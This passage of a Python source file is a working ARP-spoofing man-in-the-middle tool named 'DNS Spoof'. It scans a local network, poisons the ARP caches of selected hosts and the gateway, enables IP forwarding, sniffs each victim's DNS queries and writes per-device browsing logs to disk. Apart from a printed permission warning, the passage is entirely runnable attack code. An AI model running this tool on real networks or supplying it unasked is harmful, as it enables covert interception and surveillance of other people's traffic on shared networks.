    to_target = ARP(
        op=2,
        pdst=target_ip,
        psrc=gateway_ip,
        hwdst=target_mac,
        hwsrc=gateway_mac,
    )
    to_gateway = ARP(
        op=2,
        pdst=gateway_ip,
        psrc=target_ip,
        hwdst=gateway_mac,
        hwsrc=target_mac,
    )
    return to_target, to_gateway


def arp_spoof_loop(
    interface: str,
    attacker_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    targets: List[Tuple[str, str]],
    stop_event: threading.Event,
) -> None:
    packets = []
    for target_ip, target_mac in targets:
        packets.extend(build_spoof_packets(attacker_mac, gateway_ip, gateway_mac, target_ip, target_mac))

    while not stop_event.is_set():
        for packet in packets:
            sendp(packet, iface=interface, verbose=0)
        time.sleep(SPOOF_INTERVAL)


def restore_arp(
    interface: str,
    gateway_ip: str,
    gateway_mac: str,
    targets: List[Tuple[str, str]],
) -> None:
    for target_ip, target_mac in targets:
        to_target, to_gateway = build_restore_packets(gateway_ip, gateway_mac, target_ip, target_mac)
        sendp(to_target, iface=interface, count=3, verbose=0)
        sendp(to_gateway, iface=interface, count=3, verbose=0)


def show_summary(state: DNSSpoofState) -> None:
    logging.info("")
    logging.info(style("DNS Spoof Summary", STYLE_BOLD))

    if not state.queries:
        logging.info("No DNS queries captured.")
        return

    device_data: Dict[str, List[str]] = defaultdict(list)
    for query in state.queries:
        device_data[query.device].append(query.domain)

    logging.info("Captured queries: %s", color_text(str(len(state.queries)), COLOR_SUCCESS))
    logging.info("Active devices: %s", color_text(str(len(device_data)), COLOR_SUCCESS))
    logging.info("")
    logging.info(style("Traffic by device:", STYLE_BOLD))

    for device, domains in sorted(device_data.items()):
        domain_counts = Counter(domains)
        top_domains = domain_counts.most_common(5)
        logging.info("  %s", color_text(device, COLOR_HIGHLIGHT))
        logging.info("    Queries: %d", len(domains))
        logging.info("    Unique domains: %d", len(set(domains)))
        if top_domains:
            logging.info("    Top domains:")
            for domain, count in top_domains:
                logging.info("      - %s (%dx)", domain, count)

    save_log(state)


def save_log(state: DNSSpoofState) -> None:
    if not state.queries:
        return

    os.makedirs(LOG_DIR, exist_ok=True)
    filename = f"dns_spoof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    filepath = os.path.join(LOG_DIR, filename)

    with open(filepath, "w", encoding="utf-8") as log_file:
        log_file.write("DNS Spoof - Log\n")
        log_file.write("=" * 60 + "\n\n")
        log_file.write(f"Session time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        log_file.write(f"Total queries: {len(state.queries)}\n\n")
        for query in state.queries:
            log_file.write(f"[{query.timestamp}] {query.device:30} -> {query.domain}\n")

    logging.info("")
    logging.info("Log saved to: %s", color_text(filepath, COLOR_SUCCESS))


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def run_dns_spoof_session() -> None:
    interfaces = list_network_interfaces()
    interface = select_interface(interfaces)

    cidr = ensure_interface_connected(interface)
    if not cidr:
        logging.error("No IPv4 address found on %s. Connect first and retry.", interface)
        sys.exit(1)

    local_ip = str(ipaddress.ip_interface(cidr).ip)
    gateway_ip = wait_for_gateway(interface, timeout=6.0)
    if not gateway_ip:
        logging.warning("Default gateway not detected for %s.", interface)
        gateway_ip = prompt_gateway_with_help(interface, cidr, local_ip)

    logging.info("")
    logging.info("Interface IP: %s", style(local_ip, COLOR_SUCCESS, STYLE_BOLD))
    logging.info("Gateway IP: %s", style(gateway_ip, COLOR_SUCCESS, STYLE_BOLD))

    logging.info("")
    logging.info(color_text("Tip: Private DNS/DoH may hide DNS traffic on port 53.", COLOR_DIM))

    while True:
        method = input(
            f"{style('Target source', STYLE_BOLD)} - "
            f"{style('Scan', STYLE_BOLD)} (S) or {style('Manual', STYLE_BOLD)} (M): "
        ).strip().lower()
        if method in {"s", "scan", ""}:
            scan_seconds = prompt_int(
                f"{style('Scan duration', STYLE_BOLD)} in seconds "
                f"({style('Enter', STYLE_BOLD)} for {style(str(DEFAULT_SCAN_SECONDS), COLOR_SUCCESS, STYLE_BOLD)}): ",
                default=DEFAULT_SCAN_SECONDS,
            )
            input(f"{style('Press Enter', STYLE_BOLD)} to scan local network on {interface}...")
            hosts = arp_scan_hosts(interface, cidr, timeout=max(1.0, float(scan_seconds)))
            if not hosts:
                logging.warning("No hosts discovered.")
                continue
            selected = select_targets_from_scan(hosts, local_ip, gateway_ip)
            if selected:
                targets = [(ip_addr, mac_addr) for ip_addr, mac_addr, _hostname in selected]
                break
            logging.info("")
            logging.info("Manual target mode selected.")
            manual_ips = prompt_manual_targets()
            targets = []
            for ip_addr in manual_ips:
                if ip_addr in {local_ip, gateway_ip}:
                    continue
                mac = resolve_mac(ip_addr, interface)
                if not mac:
                    logging.warning("Could not resolve MAC for %s", ip_addr)
                    continue
                targets.append((ip_addr, mac))
            if targets:
                break
            logging.warning("No valid targets resolved. Try again.")
            continue
        if method in {"m", "manual"}:
            manual_ips = prompt_manual_targets()
            targets = []
            for ip_addr in manual_ips:
                if ip_addr in {local_ip, gateway_ip}:
                    continue
                mac = resolve_mac(ip_addr, interface)
                if not mac:
                    logging.warning("Could not resolve MAC for %s", ip_addr)
                    continue
                targets.append((ip_addr, mac))
            if targets:
                break
            logging.warning("No valid targets resolved. Try again.")
            continue
        logging.warning("Please enter S or M.")

    gateway_mac = resolve_mac_with_fallback(gateway_ip, interface)
    if not gateway_mac:
        logging.warning("Could not resolve gateway MAC for %s.", gateway_ip)
        if is_tool_available("nmtui"):
            retry_choice = input(f"{style('Open nmtui', STYLE_BOLD)} to fix connection? (Y/N): ").strip().lower()
            if retry_choice in {"", "y", "yes"}:
                run_nmtui()
                cidr = ensure_interface_connected(interface)
                if not cidr:
                    logging.error("No IPv4 address found on %s. Connect first and retry.", interface)
                    sys.exit(1)
                local_ip = str(ipaddress.ip_interface(cidr).ip)
                gateway_ip = wait_for_gateway(interface, timeout=6.0)
                if not gateway_ip:
                    gateway_ip = prompt_gateway_with_help(interface, cidr, local_ip)
        gateway_mac = resolve_mac_with_fallback(gateway_ip, interface)
        if not gateway_mac:
            logging.error("Could not resolve gateway MAC for %s", gateway_ip)
            sys.exit(1)

    attacker_mac = get_interface_mac(interface)
    if not attacker_mac:
        logging.error("Could not read MAC for %s", interface)
        sys.exit(1)

    logging.info("")
    logging.info(style("Targets:", STYLE_BOLD))
    for ip_addr, mac_addr in targets:
        logging.info("  %s %s", color_text(ip_addr, COLOR_HIGHLIGHT), mac_addr)

    confirm = input(f"{style('Start ARP spoof + DNS sniff', STYLE_BOLD)}? (Y/N): ").strip().lower()
    if confirm != "y":
        logging.info("Aborted.")
        return

    logging.info("")
    logging.info(style("Enabling IP forwarding...", STYLE_BOLD))
    original_forward = enable_ip_forwarding()

    stop_event = threading.Event()

    spoofer = threading.Thread(
        target=arp_spoof_loop,
        args=(interface, attacker_mac, gateway_ip, gateway_mac, targets, stop_event),
        daemon=True,
    )
    spoofer.start()

    def wait_for_stop() -> None:
        try:
            input()
        except EOFError:
            pass
        stop_event.set()

    stopper = threading.Thread(target=wait_for_stop, daemon=True)
    stopper.start()

    show_live_header(interface, gateway_ip, len(targets))
    state = DNSSpoofState()
    run_dns_sniffer(interface, stop_event, state)

    stop_event.set()
    spoofer.join(timeout=2)
    stopper.join(timeout=1)

    logging.info("")
    logging.info(style("Restoring network state...", STYLE_BOLD))
    restore_arp(interface, gateway_ip, gateway_mac, targets)
    restore_ip_forwarding(original_forward)

    show_summary(state)


def main() -> None:
    logging.info(color_text("DNS Spoof", COLOR_HEADER))
    logging.info("MITM DNS visibility for local clients")
    logging.info("")

    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test.")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    if not SCAPY_AVAILABLE:
        logging.error("Scapy is not installed. Install with: pip3 install scapy")
        sys.exit(1)

    required_tools = ["ip", "ethtool"]
    missing = []
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            missing.append(tool)

    if missing:
        logging.error("Missing required tools: %s", ", ".join(missing))
        sys.exit(1)

    try:
        run_dns_spoof_session()
    except KeyboardInterrupt:
        logging.info("\n")
        logging.info(color_text("Stopped by user.", COLOR_WARNING))


if __name__ == "__main__":
    main()
